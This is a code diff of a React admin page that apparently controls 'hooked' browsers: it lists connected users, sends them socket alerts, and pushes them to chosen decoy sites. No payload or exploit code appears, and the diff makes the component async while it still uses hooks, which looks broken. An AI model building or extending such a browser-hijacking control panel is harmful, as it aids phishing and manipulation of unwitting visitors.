@@ -1,16 +1,15 @@
 'use client'
-import { useEffect, useState } from "react";
+import { use, useEffect, useState } from "react";
 import { useRouter } from 'next/navigation';
 
 import Button from "@mui/material/Button";
 import { TextField } from "@mui/material";
 import adminStyles from "@/components/adminDecoy/adminDecoy.module.css";
 import { socket } from "@/app/socket.js";
-
-const Home = () => {
+import { getWebSites } from "@/actions/actions.jsx";
+export default async function Home() {
 
   const [webSitesInProject, setWebSitesInProject] = useState([]);
-  const [currentUser, setCurrentUser] = useState(null);
 
   const [message, setMessage] = useState("");
   const [isConnected, setIsConnected] = useState(false);
@@ -61,37 +60,11 @@ const Home = () => {
     };
   }, [router]);
 
-  // useEffect(() => {
-  //   try {
-  //     const fetchData = async () => {
-  //       const response = await fetch("../../api/admin/auth");
-  //       const data = await response.json();
-  //       console.log(data);
-
-  //       if (data.message === "Authorized" && data.userData.username === "admin") {
-  //         console.log("Authorized");
-  //         setCurrentUser(data.userData.username);
-  //       }
-
-  //     };
-  //     fetchData();
-  //   } catch (error) {
-  //     console.error("Error reading file", error);
-  //   }
-  // }, []);
-
   useEffect(() => {
-    try {
-      const fetchData = async () => {
-        const response = await fetch("../../api/admin/sitesInProject");
-        const data = await response.json();
-        setWebSitesInProject(data.data);
-      };
-      fetchData();
-    } catch (error) {
-      console.error("Error reading file", error);
-    }
-  }, []);
+    getWebSites().then((data) => {
+      setWebSitesInProject(data);
+    });
+  }, [])
 
   const handleAlertClick = (userId) => {
     if (socket) {
@@ -120,58 +93,57 @@ const Home = () => {
     }
   };
 
-  //console.log(currentUser)
   return (
     <div>
-      {/* {currentUser ? ( */}
-        <div className={adminStyles.dataColumn}>
-          {userList.length > 0 ? (
-            userList.map((user, index) => (
-              <div key={index} className={adminStyles.userData}>
-                <div className={adminStyles.data}>
-                  <h2>Connected User</h2>
-                  <h3>{user}</h3>
-                  <div className={adminStyles.alertOptions}>
-                    <TextField
-                      id="message"
-                      label="Message"
-                      variant="standard"
-                      color="success"
-                      value={message}
-                      onChange={handleMessageChange}
-                      style={{ marginBottom: "1%" }}
-                      onKeyDown={(event) => handleTextFieldKeyPress(event, user)}
-                    />
+     
+      <div className={adminStyles.dataColumn}>
+        {userList.length > 0 ? (
+          userList.map((user, index) => (
+            <div key={index} className={adminStyles.userData}>
+              <div className={adminStyles.data}>
+                <h2>Connected User</h2>
+                <h3>{user}</h3>
+                <div className={adminStyles.alertOptions}>
+                  <TextField
+                    id="message"
+                    label="Message"
+                    variant="standard"
+                    color="success"
+                    value={message}
+                    onChange={handleMessageChange}
+                    style={{ marginBottom: "1%" }}
+                    onKeyDown={(event) => handleTextFieldKeyPress(event, user)}
+                  />
+                  <Button
+                    variant="contained"
+                    color="success"
+                    onClick={() => handleAlertClick(user)}
+                    style={{ margin: "1%" }}
+                  >
+                    Alert
+                  </Button>
+                  {webSitesInProject.length > 0 && webSitesInProject.map((site, index) => (
                     <Button
+                      key={site.id || index} // Use index as key if site.id is not defined
                       variant="contained"
                       color="success"
-                      onClick={() => handleAlertClick(user)}
+                      onClick={() => handlePushToPageClick(site.name, user)}
                       style={{ margin: "1%" }}
                     >
-                      Alert
+                      Push {site.name}
                     </Button>
-                    {webSitesInProject.length > 0 && webSitesInProject.map((site, index) => (
-                      <Button
-                        key={site.id || index} // Use index as key if site.id is not defined
-                        variant="contained"
-                        color="success"
-                        onClick={() => handlePushToPageClick(site.name, user)}
-                        style={{ margin: "1%" }}
-                      >
-                        Push {site.name}
-                      </Button>
-                    ))}
-                  </div>
+                  ))}
                 </div>
               </div>
-            ))
-          ) : (
-            <p>No hooked Browsers!</p>
-          )}
-        </div>     
-  
+            </div>
+          ))
+        ) : (
+          <p>No hooked Browsers!</p>
+        )}
+      </div>
+
       <div className={adminStyles.contentRow}>
-        <Button variant="contained" color="success" onClick={() => router.push("/admin")}>
+        <Button style={{ margin: "10px" }} variant="contained" color="success" onClick={() => router.push("/admin")}>
           Back
         </Button>
       </div>
@@ -180,4 +152,3 @@ const Home = () => {
 };
 
 
-export default Home;
